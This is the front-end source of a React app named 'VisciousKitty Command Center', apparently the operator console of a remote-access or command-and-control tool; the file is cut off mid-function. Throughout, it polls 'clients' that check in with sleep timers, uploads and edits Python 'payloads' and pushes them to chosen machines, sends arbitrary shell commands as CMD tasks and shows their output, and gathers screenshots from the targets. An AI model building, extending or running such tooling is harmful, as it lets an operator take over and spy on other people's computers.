import './App.css';
import { useEffect, useState, useCallback, useRef } from 'react'
import { createPortal } from 'react-dom'

// Reusable custom checkbox component (vk)
function VkCheckbox({ id, checked=false, onChange, label, className='' }){
  const uid = id || ('vkcb-' + Math.random().toString(36).slice(2,8))
  return (
    <label className={`vk-checkbox ${className||''}`} htmlFor={uid}>
      <input id={uid} type='checkbox' checked={!!checked} onChange={e => onChange && onChange(e.target.checked)} />
      <span className='vk-box' aria-hidden='true'>
        <svg className='vk-check' viewBox='0 0 24 24' width='14' height='14' xmlns='http://www.w3.org/2000/svg'>
          <polyline points='20 6 9 17 4 12' stroke='currentColor' fill='none' strokeWidth='2.6' strokeLinecap='round' strokeLinejoin='round' />
        </svg>
      </span>
      {label ? <span className='vk-label'>{label}</span> : null}
    </label>
  )
}
// Custom select (vk) - simple dropdown replacement for native <select>
function VkSelect({ value, onChange, options = [], placeholder = 'Select' }){
  const [open, setOpen] = useState(false)
  const ref = useRef(null)
  useEffect(()=>{
    const onDoc = (e) => { if(ref.current && !ref.current.contains(e.target)) setOpen(false) }
    document.addEventListener('click', onDoc)
    document.addEventListener('keydown', (ev) => { if(ev.key === 'Escape') setOpen(false) })
    return ()=>{ document.removeEventListener('click', onDoc) }
  }, [])
  const selected = options.find(o => o.value === value)
  return (
    <div className={`vk-select ${open? 'open':''}`} ref={ref}>
      <div className='vk-select__trigger' onClick={()=>setOpen(s=>!s)} role='button' tabIndex={0} onKeyDown={e=>{ if(e.key==='Enter' || e.key===' ') setOpen(s=>!s) }}>
        <div className='vk-select__label'>{selected ? selected.label : placeholder}</div>
        <div className='vk-select__caret'>▾</div>
      </div>
      {open && (
        <div className='vk-select__list' role='listbox'>
          {options.map(o => (
            <div key={o.value} role='option' aria-selected={o.value===value} className={`vk-select__option ${o.value===value? 'selected':''}`} onClick={()=>{ onChange(o.value); setOpen(false) }}>
              {o.label}
            </div>
          ))}
        </div>
      )}
    </div>
  )
}

// Nickname helpers persisted in localStorage
function loadNicknames(){ try{ return JSON.parse(localStorage.getItem('vk_nicknames')||'{}') }catch{return {}} }
function saveNicknames(map){ try{ localStorage.setItem('vk_nicknames', JSON.stringify(map||{})) }catch{} }

const SERVER = 'http://127.0.0.1:8000'

function usePolling(fn, ms = 5000) {
  useEffect(() => {
    let mounted = true
    let handle = null
    const run = async () => {
      if (!mounted) return
      try { await fn() } catch (e) { /* ignore */ }
      handle = setTimeout(run, ms)
    }
    run()
    return () => { mounted = false; if (handle) clearTimeout(handle) }
  }, [fn, ms])
}

function formatAgo(epochSeconds){
  if (!epochSeconds) return '-'
  const delta = Date.now()/1000 - epochSeconds
  if (delta < 2) return 'just now'
  if (delta < 60) return `${Math.round(delta)}s ago`
  if (delta < 3600) return `${Math.round(delta/60)}m ago`
  if (delta < 86400) return `${Math.round(delta/3600)}h ago`
  return `${Math.round(delta/86400)}d ago`
}

function genId(){
  return Date.now().toString(36) + '-' + Math.random().toString(36).slice(2,10)
}

// Poll the server for a result matching a task_id for a given machine.
// Calls `onFound(resultRecord)` when a matching result is discovered.
function watchForResult(taskId, machineId, onFound, intervalMs = 1500, timeoutMs = 120000){
  let stopped = false
  let iv = null
  let to = null
  const stop = () => { stopped = true; if(iv) clearInterval(iv); if(to) clearTimeout(to) }

  const check = async () => {
    if (stopped) return
    try{
      const r = await fetch(SERVER + '/results?machine_id=' + encodeURIComponent(machineId))
      const d = await r.json()
      const list = d.results || []
      const found = list.find(x => x.task_id === taskId)
      if (found) {
        stop()
        try{ onFound(found) }catch(e){ console.error(e) }
      }
    }catch(e){ /* ignore transient errors */ }
  }

  // run immediately then at interval
  check()
  iv = setInterval(check, intervalMs)
  to = setTimeout(() => { stop(); }, timeoutMs)
  return stop
}

// Poll server for a screenshot uploaded for a specific task_id for a machine
function watchForScreenshot(taskId, machineId, onFound, intervalMs = 700, timeoutMs = 15000){
  let stopped = false
  let iv = null
  let to = null
  const stop = () => { stopped = true; if(iv) clearInterval(iv); if(to) clearTimeout(to) }
  const check = async () => {
    if (stopped) return
    try{
      const r = await fetch(SERVER + '/screenshot?machine_id=' + encodeURIComponent(machineId))
      const d = await r.json()
      const s = d.screenshot
      if (s && s.task_id === taskId) {
        stop()
        try{ onFound(s) }catch(e){ console.error(e) }
      }
    }catch(e){ /* ignore */ }
  }
  check()
  iv = setInterval(check, intervalMs)
  to = setTimeout(() => { stop(); }, timeoutMs)
  return stop
}
function Header({clients, tasks}){
  return (
    <div className="headerRow">
      <div>
        <div style={{display:'flex', alignItems:'center', gap:12}}>
          <div className="badge">🚀</div>
          <div>
            <h2 style={{margin:0}}>VisciousKitty Command Center</h2>
            <div className="muted">Dark-space control panel</div>
          </div>
        </div>
      </div>
      <div style={{display:'flex', gap:10}}>
        <div className='statusPill'>{clients} clients online</div>
        <div className='statusPill' style={{background:'linear-gradient(90deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01))'}}>{tasks} tasks pending</div>
      </div>
    </div>
  )
}

function SmallCard({title, value, children}){
  return (
    <div className='card'>
      <h3>{title}</h3>
      <div style={{display:'flex', alignItems:'center', justifyContent:'space-between'}}>
        <div className='count'>{value}</div>
        <div style={{textAlign:'right'}} className='small'>{children}</div>
      </div>
    </div>
  )
}

function App(){
  const [tab, setTab] = useState('dashboard')
  const [selectedMachine, setSelectedMachine] = useState(null)
  const [clients, setClients] = useState([])
  const [tasksCount, setTasksCount] = useState(0)
  const [clientsCount, setClientsCount] = useState(0)
  const [payloads, setPayloads] = useState([])
  const [pollMs, setPollMs] = useState(() => {
    try{ const v = localStorage.getItem('vk_poll_ms'); return v ? parseInt(v,10) : 10000 }catch{ return 10000 }
  })
  const [reduceMotion, setReduceMotion] = useState(() => {
    try{ return localStorage.getItem('vk_reduce_motion') === '1' }catch{ return false }
  })
  // simple ticking state to trigger per-second re-renders for countdowns
  const [now, setNow] = useState(() => Date.now()/1000)
  const [nicknames, setNicknames] = useState(() => loadNicknames())

  const setNickname = (machineId, name) => {
    setNicknames(prev => {
      const next = {...(prev||{})}
      if(name) next[machineId] = name
      else delete next[machineId]
      saveNicknames(next)
      return next
    })
  }

  // FIXED — stable callback (this prevents infinite polling spawns)
  const fetchCounts = useCallback(async () => {
    try{
      const cs = await (await fetch(SERVER + '/clients_status')).json()
      const mapping = cs.clients_status || {}
      setClients(Object.entries(mapping).map(([id, info]) => ({id, ...info})))
      setClientsCount(Object.keys(mapping).length)

      try{
        const rt = await fetch(SERVER + '/tasks_count')
        const dt = await rt.json()
        setTasksCount(dt.count || 0)
      }catch(e){ setTasksCount(0) }
    }catch(e){ /* ignore */ }
  }, [])

  // FIXED — stable callback
  const loadPayloads = useCallback(async () => {
    try{
      const r = await fetch(SERVER + '/payloads')
      const d = await r.json()
      setPayloads(d.payloads || [])
    }catch(e){ /* ignore */ }
  }, [])

  // Polling uses a configurable interval
  usePolling(fetchCounts, pollMs)

  useEffect(() => { fetchCounts(); loadPayloads() }, [fetchCounts, loadPayloads])
  useEffect(() => { try{ localStorage.setItem('vk_poll_ms', String(pollMs)) }catch(e){} }, [pollMs])
  useEffect(() => { if (reduceMotion) document.documentElement.classList.add('reduced-motion'); else document.documentElement.classList.remove('reduced-motion'); try{ localStorage.setItem('vk_reduce_motion', reduceMotion ? '1':'0') }catch(e){} }, [reduceMotion])

  // tick every second to update countdown displays
  useEffect(() => {
    const iv = setInterval(() => setNow(Date.now()/1000), 1000)
    return () => clearInterval(iv)
  }, [])

  return (
    <div className="App">
      <div className="stars" />
      <div className="nebula" />
      <div className='container'>
        <aside className='sidebar'>
          <div className='logo'>
            <div className='badge'>VK</div>
            <div>
              <h1>VisciousKitty</h1>
              <div className='muted'>fleet control</div>
            </div>
          </div>

          <div style={{height:8}} />
          <div style={{display:'flex', gap:8, marginBottom:12}}>
            <div className='statusPill'>Dark mode</div>
            <div className='statusPill' style={{color:'#fff', background:'transparent', border:'1px solid rgba(255,255,255,0.03)'}}>v0.1</div>
          </div>

          <div className='nav'>
            <button className={tab==='dashboard'? 'active':''} onClick={()=>setTab('dashboard')}>Dashboard</button>
            <button className={tab==='clients'? 'active':''} onClick={()=>setTab('clients')}>Clients</button>
            <button className={tab==='tasks'? 'active':''} onClick={()=>setTab('tasks')}>Tasks</button>
            <button className={tab==='payloads'? 'active':''} onClick={()=>setTab('payloads')}>Payloads</button>
            <button className={tab==='results'? 'active':''} onClick={()=>setTab('results')}>Results</button>
            <div style={{height:6}}></div>
            <button className={tab==='customize'? 'active':''} onClick={()=>setTab('customize')}>Customize</button>
            <button className={tab==='settings'? 'active':''} onClick={()=>setTab('settings')}>Settings</button>
          </div>
        </aside>

        <main className='main'>
          <Header clients={clientsCount} tasks={tasksCount} />

          {tab === 'dashboard' && (
            <div className="panel">
              <div className='grid'>
                <SmallCard title='Clients online' value={clientsCount}>Active machines reporting</SmallCard>
                <SmallCard title='Pending tasks' value={tasksCount}>Tasks queued for clients</SmallCard>
                <SmallCard title='Payloads' value={'payloads'}>Upload & deploy python payloads</SmallCard>
                <SmallCard title='Results' value={'stored'}>Persistent results DB</SmallCard>
              </div>

              <div style={{marginTop:18}} className='card'>
                <h3>Recent Clients</h3>
                <div style={{marginTop:8}}>
                  <table className='table'>
                    <thead><tr><th>machine_id</th><th>last seen</th><th>sleeping_in(s)</th><th>has_task</th><th>actions</th></tr></thead>
                    <tbody>
                      {clients.slice(0,6).map(c => (
                        <tr key={c.id} className='rowClickable' onClick={() => { setSelectedMachine(c.id); setTab('machine') }}>
                          <td style={{maxWidth:380}}>{c.id}</td>
                          <td>{c.last_seen? formatAgo(c.last_seen): '-'}</td>
                          <td>{typeof c.sleeping_until === 'number' && c.sleeping_until ? Math.max(0, Math.round(c.sleeping_until - now)) : '-'}</td>
                          <td>{String(c.has_task)}</td>
                          <td><SendPayloadInline server={SERVER} target={c.id} payloads={payloads} /></td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          )}

          {/* Clients panel (rendered below with nickname support) */}
          {tab === 'tasks' && <div className="panel"><TasksPanel server={SERVER} /></div>}
          {tab === 'payloads' && <div className="panel"><PayloadsPanel server={SERVER} payloads={payloads} setPayloads={setPayloads} /></div>}
          {tab === 'clients' && <div className="panel"><ClientsPanel server={SERVER} payloads={payloads} onOpenMachine={(id)=>{ setSelectedMachine(id); setTab('machine') }} now={now} nicknames={nicknames} setNickname={setNickname} /></div>}
          {tab === 'results' && <div className="panel"><ResultsPanel server={SERVER} nicknames={nicknames} setNickname={setNickname} /></div>}
          {tab === 'machine' && selectedMachine && <div className="panel"><MachinePanel server={SERVER} machineId={selectedMachine} payloads={payloads} nicknames={nicknames} setNickname={setNickname} /></div>}
          {tab === 'customize' && <div className="panel"><CustomizePanel /></div>}
          {tab === 'settings' && <div className="panel"><SettingsPanel /></div>}

          <div className='footer'>Made with ❤️ in the void — VisciousKitty</div>
        </main>
      </div>
    </div>
  )
}

/* ---------------------- OTHER COMPONENTS (unchanged) ---------------------- */

function ClientsPanel({server, payloads=[], nicknames = {}, setNickname, onOpenMachine, now}){
  const [items, setItems] = useState([])
  useEffect(()=>{ (async ()=>{ try{ const r=await fetch(server + '/clients_status'); const d=await r.json(); setItems(Object.entries(d.clients_status||{}).map(([id,s]) => ({id, ...s}))) }catch(e){} })() }, [server])
  return (
    <div>
      <h3>Clients</h3>
      <div className='card' style={{marginTop:8}}>
        <table className='table'><thead><tr><th>#</th><th>machine_id</th><th>nickname</th><th>last_seen</th><th>sleeping_in(s)</th><th>has_task</th><th>actions</th></tr></thead>
        <tbody>
        {items.map((c,i)=> <ClientRow key={c.id} idx={i} c={c} payloads={payloads} server={server} nicknames={nicknames} setNickname={setNickname} onOpenMachine={onOpenMachine} now={now} />)}
        </tbody></table>
      </div>
    </div>
  )
}

function ClientRow({idx, c, payloads, server, now, nicknames = {}, setNickname, onOpenMachine}){
  // prefer App-level `now` when available via closure — otherwise fallback to Date.now()/1000
  const useNow = typeof window !== 'undefined' && window.__VK_NOW ? window.__VK_NOW : null
  const nowVal = useNow || Date.now()/1000
  // compute sleeping seconds if present
  const secs = (typeof c.sleeping_until === 'number' && c.sleeping_until) ? Math.max(0, Math.round(c.sleeping_until - nowVal)) : null
  const sleeping = secs !== null && secs > 0
  const nick = (nicknames && nicknames[c.id]) || ''
  return (
    <tr className='rowClickable' onClick={() => onOpenMachine ? onOpenMachine(c.id) : null}>
      <td>{idx+1}</td>
      <td style={{maxWidth:380}}>{c.id}</td>
      <td style={{maxWidth:220, color:'var(--muted)'}}>{nick || <span style={{color:'var(--muted)'}}>-</span>} <button className='btn' style={{marginLeft:8,padding:'4px 6px'}} onClick={(e)=>{ e.stopPropagation(); const res = window.prompt('Set nickname for this machine (blank to clear):', nick || ''); if(res !== null){ setNickname && setNickname(c.id, res || '') } }}>✎</button></td>
      <td>{c.last_seen? formatAgo(c.last_seen) : '-'}</td>
      <td><span style={{display:'inline-flex', alignItems:'center'}}><span className={`statusDot ${sleeping? 'sleeping':'idle'}`} />{secs !== null ? <AnimatedCountdown value={secs} /> : '-'}</span></td>
      <td>{String(c.has_task)}</td>
      <td><SendPayloadInline server={server} target={c.id} payloads={payloads} /></td>
    </tr>
  )
}

// Animated numeric decrement component - briefly toggles a class when the value changes
function AnimatedCountdown({value}){
  const [tick, setTick] = useState(false)
  const [last, setLast] = useState(value)
  useEffect(()=>{
    if (value !== last){
      setTick(true)
      setLast(value)
      const t = setTimeout(()=> setTick(false), 320)
      return ()=> clearTimeout(t)
    }
  }, [value, last])
  return <span className={`countdown ${tick? 'tick':''}`}>{typeof value === 'number' ? value : '-'}</span>
}

function SendPayloadInline({server=SERVER, target, payloads = []}){
  const [open, setOpen] = useState(false)
  const [sel, setSel] = useState('')
  const [loading, setLoading] = useState(false)

  const send = async () =>{
    if(!sel) return
    setLoading(true)
    try{
      const id = genId()
      const url = `${server}/addtask?task_id=${encodeURIComponent(id)}&task_type=PAYLOAD&machine_id=${encodeURIComponent(target)}&command=${encodeURIComponent(sel)}`
      const r = await fetch(url, {method:'POST'})
      if(!r.ok) console.error('send payload failed', r.status)
      setOpen(false)
      setSel('')
    }catch(e){ console.error(e) }
    setLoading(false)
  }

  return (
    <div style={{display:'flex', gap:8, alignItems:'center'}}>
      {!open && <button className='btn btn--fancy' style={{padding:'6px 8px', fontSize:12}} onClick={(e)=>{ e.stopPropagation(); setOpen(true)}}>Send payload</button>}
      {open && (
        <div style={{display:'flex', gap:8, alignItems:'center'}} className='inlineForm' onClick={e => e.stopPropagation()}>
          <select value={sel} onChange={e=>setSel(e.target.value)} className='payloadSelect'>
            <option value=''>-- pick payload --</option>
            {payloads.map(p => <option key={p.id} value={p.file_name}>{p.file_name}</option>)}
          </select>
          <button className='btn btn--fancy' onClick={(e)=>{ e.stopPropagation(); send() }} disabled={loading || !sel} style={{padding:'6px 10px'}}>{loading? 'Sending...' : 'Send'}</button>
          <button className='btn' onClick={(e)=>{ e.stopPropagation(); setOpen(false); setSel('') }} style={{padding:'6px 10px', background:'transparent', color:'var(--muted)', border:'1px solid rgba(255,255,255,0.03)'}}>Cancel</button>
        </div>
      )}
    </div>
  )
}

function TasksPanel({server}){
  const [target, setTarget] = useState('')
  const [tasks, setTasks] = useState([])
  const load = async (t)=>{
    if(!t) return
    try{ const r = await fetch(server + '/tasks?short_id=' + encodeURIComponent(t)); const d = await r.json(); setTasks(d.tasks || []) }catch(e){ setTasks([{error: String(e)}]) }
  }
  return (
    <div>
      <h3>Tasks</h3>
      <div style={{display:'flex', gap:8, marginTop:10}}>
        <input placeholder='short id or machine_id' value={target} onChange={e=>setTarget(e.target.value)} style={{padding:8, borderRadius:8, border:'1px solid rgba(255,255,255,0.03)', background:'transparent', color:'inherit'}} />
        <button className='btn' onClick={()=>load(target)}>Load</button>
      </div>
      <div className='card' style={{marginTop:12}}>
        <table className='table'><thead><tr><th>task_id</th><th>type</th><th>payload</th></tr></thead>
        <tbody>
          {tasks.map(t => (
            <tr key={t.task_id}><td>{t.task_id}</td><td>{t.type}</td><td style={{maxWidth:600}}>{t.command || t.script || t.payload_name || ''}</td></tr>
          ))}
        </tbody></table>
      </div>
    </div>
  )
}

function PayloadsPanel({server, payloads = [], setPayloads}){
  const [list, setList] = useState(payloads || [])
  const [file, setFile] = useState(null)
  const [selectedPayload, setSelectedPayload] = useState(null)
  const [payloadContent, setPayloadContent] = useState('')
  const [machines, setMachines] = useState([])
  const [sendTarget, setSendTarget] = useState('')
  const [saveLoading, setSaveLoading] = useState(false)
  const [sendLoading, setSendLoading] = useState(false)
  const [messages, setMessages] = useState([])
  useEffect(()=>{
    if (payloads && payloads.length) {
      setList(payloads)
      return
    }
    (async ()=>{ try{ const r=await fetch(server + '/payloads'); const d=await r.json(); setList(d.payloads || []) }catch(e){} })()
  }, [server, payloads])
  useEffect(()=>{
    // load clients so editor can target machines for deploy
    (async ()=>{
      try{
        const r = await fetch(server + '/clients_status')
        const d = await r.json()
        const m = Object.keys(d.clients_status || {})
        setMachines(m)
      }catch(e){}
    })()
  }, [server])
  
  const openEditor = async (p) =>{
    setSelectedPayload(p)
    setPayloadContent('Loading...')
    try{
      const r = await fetch(server + '/payload?file_name=' + encodeURIComponent(p.file_name))
      const d = await r.json()
      setPayloadContent(d.content || '')
    }catch(e){ setPayloadContent(`Error loading: ${String(e)}`) }
  }

  const closeEditor = () => { setSelectedPayload(null); setPayloadContent(''); setSendTarget('') }

  const savePayload = async () =>{
    if(!selectedPayload) return
    setSaveLoading(true)
    try{
      const body = { file_name: selectedPayload.file_name, content: payloadContent }
      const r = await fetch(server + '/upload_payload', { method: 'POST', headers: {'content-type':'application/json'}, body: JSON.stringify(body) })
      const d = await r.json()
      setMessages(prev => [`Saved ${selectedPayload.file_name}`, ...prev].slice(0,10))
      // update local list and parent
      setList(prev => prev.map(it => it.id === d.payload.id ? d.payload : it))
      if (typeof setPayloads === 'function') setPayloads(prev => prev.map(it => it.id === d.payload.id ? d.payload : it))
    }catch(e){ setMessages(prev => [`Save error: ${String(e)}`, ...prev].slice(0,10)) }
    setSaveLoading(false)
  }

  const sendToMachine = async () =>{
    if(!selectedPayload || !sendTarget) return
    setSendLoading(true)
    try{
      const id = genId()
      const url = `${server}/addtask?task_id=${encodeURIComponent(id)}&task_type=PAYLOAD&machine_id=${encodeURIComponent(sendTarget)}&command=${encodeURIComponent(selectedPayload.file_name)}`
      const r = await fetch(url, {method:'POST'})
      if(r.ok) setMessages(prev => [`Sent ${selectedPayload.file_name} -> ${sendTarget}`, ...prev].slice(0,10))
      else setMessages(prev => [`Send failed: ${r.status}`, ...prev].slice(0,10))
    }catch(e){ setMessages(prev => [`Send error: ${String(e)}`, ...prev].slice(0,10)) }
    setSendLoading(false)
  }
  const upload = async () =>{
    if(!file) return
    try{
      const text = await file.text()
      const resp = await fetch(server + '/upload_payload', {method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify({file_name: file.name, content: text})})
      const d = await resp.json()
      setList(prev => [d.payload, ...prev])
      if (typeof setPayloads === 'function') setPayloads(prev => [d.payload, ...(prev || [])])
    }catch(e){ console.error(e) }
  }
  return (
    <div>
      <h3>Payloads</h3>
      <div style={{display:'flex', gap:8, alignItems:'center'}}>
        <label className='fileControl'>
          <input id='payload-file-input' type='file' accept='.py' onChange={e=>setFile(e.target.files && e.target.files[0])} />
          <div className='fileName'>{file ? file.name : 'Choose a .py file...'}</div>
        </label>
        <label htmlFor='payload-file-input' className='filePicker'>Browse</label>
        <button className='btn btn--fancy' onClick={upload} disabled={!file}>{file ? 'Upload' : 'Upload'}</button>
      </div>
      <div className='card' style={{marginTop:12}}>
        <table className='table'><thead><tr><th>id</th><th>file_name</th><th>timestamp</th></tr></thead>
        <tbody>
          {list.map(p => <tr key={p.id}><td>{p.id}</td><td><button className='btn' onClick={()=>openEditor(p)} style={{background:'transparent', border:'none', color:'var(--accent)'}}>{p.file_name}</button></td><td>{new Date(p.timestamp*1000).toLocaleString()}</td></tr>)}
        </tbody></table>
      </div>
      {selectedPayload && (
        <div className='card' style={{marginTop:12}}>
          <h3>Editing: {selectedPayload.file_name}</h3>
          <div style={{display:'flex', gap:8, marginBottom:8}}>
            <button className='btn btn--fancy' onClick={savePayload} disabled={saveLoading}>{saveLoading? 'Saving...':'Save'}</button>
            <select value={sendTarget} onChange={e=>setSendTarget(e.target.value)} style={{padding:8, borderRadius:8, background:'transparent'}}>
              <option value=''>-- send to machine --</option>
              {machines.map(m => <option key={m} value={m}>{m}</option>)}
            </select>
            <button className='btn' onClick={sendToMachine} disabled={sendLoading || !sendTarget}>{sendLoading? 'Sending...':'Send'}</button>
            <div style={{marginLeft:'auto'}}><button className='btn' onClick={closeEditor}>Close</button></div>
          </div>
          <textarea value={payloadContent} onChange={e=>setPayloadContent(e.target.value)} style={{width:'100%', minHeight:300, fontFamily:'ui-monospace, SFMono-Regular, Menlo, Monaco, monospace', fontSize:13, background:'rgba(0,0,0,0.6)', color:'inherit', padding:12, borderRadius:8}} />
          <div style={{marginTop:8}}>
            {messages.map((m,i)=> <div key={i} style={{padding:'6px 0', borderBottom:'1px dashed rgba(255,255,255,0.02)'}}>{m}</div>)}
          </div>
        </div>
      )}
    </div>
  )
}

function ResultsPanel({server, nicknames = {}, setNickname}){
  const [items, setItems] = useState([])
  const [preview, setPreview] = useState(null)
  const [selectedIds, setSelectedIds] = useState(() => new Set())
  const [loading, setLoading] = useState(false)
  const [deleting, setDeleting] = useState(false)
  const [query, setQuery] = useState('')
  const [machineFilter, setMachineFilter] = useState('')
  const [quickRange, setQuickRange] = useState('all')

  const loadAll = async () =>{
    setLoading(true)
    try{
      const r = await fetch(server + '/results_all')
      const d = await r.json()
      setItems(d.results || [])
    }catch(e){ console.error(e); setItems([]) }
    setLoading(false)
  }

  useEffect(()=>{ loadAll() }, [server])

  const toggleSelect = (id) =>{
    setSelectedIds(prev => {
      const next = new Set(prev)
      if(next.has(id)) next.delete(id); else next.add(id)
      return next
    })
  }

  const selectAllVisible = (visible) =>{
    if(visible.length === 0) return
    setSelectedIds(prev => {
      const next = new Set(prev)
      const allVisibleIds = visible.map(x => x.id)
      const allSelected = allVisibleIds.every(id => next.has(id))
      if(allSelected){ allVisibleIds.forEach(id => next.delete(id)) }
      else { allVisibleIds.forEach(id => next.add(id)) }
      return next
    })
  }

  const deleteSelected = async () =>{
    if(selectedIds.size === 0) return
    // eslint-disable-next-line no-alert
    if(!window.confirm(`Delete ${selectedIds.size} selected result(s)? This cannot be undone.`)) return
    setDeleting(true)
    try{
      await Promise.all(Array.from(selectedIds).map(id => fetch(server + '/result?id=' + encodeURIComponent(id), { method: 'DELETE' })))
      setSelectedIds(new Set())
      await loadAll()
    }catch(e){ console.error(e) }
    setDeleting(false)
  }

  const view = async (id)=>{
    try{ const r = await fetch(server + '/result?id=' + encodeURIComponent(id)); const d = await r.json(); setPreview(d.result) }catch(e){ setPreview({error:String(e)}) }
  }

  const deleteResult = async (id) => {
    // eslint-disable-next-line no-alert
    if (!window.confirm('Delete this result?')) return
    try{
      await fetch(server + '/result?id=' + encodeURIComponent(id), { method: 'DELETE' })
      await loadAll()
    }catch(e){ console.error(e) }
  }

  // client-side filters
  const filtered = items.filter(it => {
    if(query){ const q = query.toLowerCase(); const text = `${it.task_id} ${it.machine_id} ${String(it.result)}`.toLowerCase(); if(!text.includes(q)) return false }
    if(machineFilter){ if(!String(it.machine_id).includes(machineFilter)) return false }
    if(quickRange !== 'all'){
      const ageSec = (Date.now()/1000) - (it.timestamp || 0)
      if(quickRange === '24h' && ageSec > 86400) return false
      if(quickRange === '7d' && ageSec > 86400*7) return false
    }
    return true
  })

  return (
    <div>
      <h3>Results ({items.length})</h3>

      <div style={{display:'flex', gap:8, marginTop:10, alignItems:'center'}}>
        <input placeholder='search task id, machine or content' value={query} onChange={e=>setQuery(e.target.value)} style={{padding:8, borderRadius:8, border:'1px solid rgba(255,255,255,0.03)', background:'transparent', color:'inherit', flex:1}} />
        <input placeholder='machine id filter' value={machineFilter} onChange={e=>setMachineFilter(e.target.value)} style={{padding:8, borderRadius:8, border:'1px solid rgba(255,255,255,0.03)', background:'transparent', color:'inherit', width:220}} />
        <VkSelect value={quickRange} onChange={setQuickRange} options={[{label:'All time', value:'all'},{label:'Last 24h', value:'24h'},{label:'Last 7d', value:'7d'}]} placeholder='Range' />
        <button className='btn' onClick={loadAll} disabled={loading}>{loading? 'Refreshing...':'Refresh'}</button>
        <button className='btn btn--fancy' onClick={deleteSelected} disabled={deleting || selectedIds.size===0}>{deleting? 'Deleting...': `Delete (${selectedIds.size})`}</button>
      </div>

      <div className='card' style={{marginTop:12}}>
        <table className='table'>
          <thead>
            <tr>
              <th style={{width:34}}><VkCheckbox className='vk-small' checked={filtered.length>0 && filtered.every(x => selectedIds.has(x.id))} onChange={() => selectAllVisible(filtered)} /></th>
              <th>id</th>
              <th>task_id</th>
              <th>machine</th>
              <th>timestamp</th>
              <th style={{maxWidth:420}}>preview</th>
              <th>actions</th>
            </tr>
          </thead>
          <tbody>
            {filtered.map(r => (
              <tr key={r.id}>
                <td><VkCheckbox className='vk-small' checked={selectedIds.has(r.id)} onChange={() => toggleSelect(r.id)} /></td>
                <td style={{fontFamily:'ui-monospace, monospace', fontSize:12}}>{r.id}</td>
                <td style={{fontFamily:'ui-monospace, monospace'}}>{r.task_id}</td>
                <td style={{maxWidth:260}}>
                  <div style={{display:'flex', flexDirection:'column'}}>
                    <div style={{display:'flex', alignItems:'center', gap:8}}>
                      <div style={{fontWeight:700}}>{r.machine_id}</div>
                      <button className='btn' style={{padding:'4px 6px'}} onClick={async ()=>{ const res = window.prompt('Set nickname for this machine (blank to clear):', (nicknames && nicknames[r.machine_id]) || ''); if(res !== null){ setNickname && setNickname(r.machine_id, res || '') } }}>✎</button>
                    </div>
                    <div style={{fontSize:12, color:'var(--muted)'}}>{nicknames && nicknames[r.machine_id] ? nicknames[r.machine_id] : ''}</div>
                  </div>
                </td>
                <td>{new Date((r.timestamp||0)*1000).toLocaleString()}</td>
                <td style={{maxWidth:420}}>{typeof r.result === 'string' ? (r.result.length>160? r.result.slice(0,160)+'...':r.result): JSON.stringify(r.result)}</td>
                <td style={{display:'flex', gap:8}}>
                  <button className='btn' onClick={()=>view(r.id)}>View</button>
                  <button className='btn' onClick={()=>deleteResult(r.id)}>Del</button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {preview && (
        <div className='card' style={{marginTop:12, whiteSpace:'pre-wrap', fontFamily:'ui-monospace, SFMono-Regular, Menlo, Monaco, monospace'}}>
          <h3>Result full view</h3>
          <div style={{maxHeight:360, overflow:'auto'}}>{typeof preview === 'string' ? preview : JSON.stringify(preview, null, 2)}</div>
        </div>
      )}
    </div>
  )
}

function MachinePanel({server, machineId, payloads=[], nicknames = {}, setNickname}){
  const [terminalCmd, setTerminalCmd] = useState('')
  const [log, setLog] = useState([])
  const terminalRef = useRef(null)
  const [screenshot, setScreenshot] = useState(null)
  const [live, setLive] = useState(false)
  const [periodicEnabled, setPeriodicEnabled] = useState(false)
  const [maxScreens, setMaxScreens] = useState(null)
  const [minSleep, setMinSleep] = useState(null)
  const [maxSleep, setMaxSleep] = useState(null)
  const [savedScreensCount, setSavedScreensCount] = useState(0)
  const [screenshotsList, setScreenshotsList] = useState([])
  const [galleryOpen, setGalleryOpen] = useState(false)
  const liveRef = useRef(null)
  const [liveFreq, setLiveFreq] = useState(2000)
  const screenshotIdRef = useRef(null)
  const [activeTab, setActiveTab] = useState('home') // 'home' | 'screen' | 'config'

  const runCmd = async () =>{
    if(!terminalCmd) return
    try{
      const id = genId()
      // send as CMD task
      const url = `${server}/addtask?task_id=${encodeURIComponent(id)}&task_type=CMD&machine_id=${encodeURIComponent(machineId)}&command=${encodeURIComponent(terminalCmd)}`
      const r = await fetch(url, {method:'POST'})
      if(r.ok){
        const waitMsg = `Waiting for result (task ${id})...`
        setLog(prev => [`Sent: ${terminalCmd}`, waitMsg, ...prev])
        setTerminalCmd('')
        // poll for the result and show it when available
        watchForResult(id, machineId, (found) => {
          const pretty = typeof found.result === 'string' ? found.result : JSON.stringify(found.result)
          setLog(prev => {
            const cleaned = prev.filter(x => !x.startsWith(`Waiting for result (task ${id})`))
            return [`Result (${id}): ${pretty}`, ...cleaned]
          })
        })
      } else setLog(prev => [`Failed to send: ${r.status}`, ...prev])
    }catch(e){ setLog(prev => [`Error: ${String(e)}`, ...prev]) }
  }

  // auto-scroll terminal when new lines appear
  useEffect(()=>{
    if(!terminalRef.current) return
    // small timeout to ensure DOM updated
    const t = setTimeout(()=>{
      try{ terminalRef.current.scrollTop = terminalRef.current.scrollHeight }catch(e){}
    }, 40)
    return ()=> clearTimeout(t)
  }, [log])

  const sendPayload = async (payloadName) =>{
    try{
      const id = genId()
      const url = `${server}/addtask?task_id=${encodeURIComponent(id)}&task_type=PAYLOAD&machine_id=${encodeURIComponent(machineId)}&command=${encodeURIComponent(payloadName)}`
      const r = await fetch(url, {method:'POST'})
      if(r.ok){
        const waitMsg = `Waiting for result (task ${id})...`
        setLog(prev => [`Queued payload: ${payloadName}`, waitMsg, ...prev])
        // poll for the result and show it when available
        watchForResult(id, machineId, (found) => {
          const pretty = typeof found.result === 'string' ? found.result : JSON.stringify(found.result)
          setLog(prev => {
            const cleaned = prev.filter(x => !x.startsWith(`Waiting for result (task ${id})`))
            return [`Result (${id}): ${pretty}`, ...cleaned]
          })
        })
      } else setLog(prev => [`Payload queue failed: ${r.status}`, ...prev])
    }catch(e){ setLog(prev => [`Error: ${String(e)}`, ...prev]) }
  }

  const requestScreenshotOnce = async () =>{
    try{
      const id = genId()
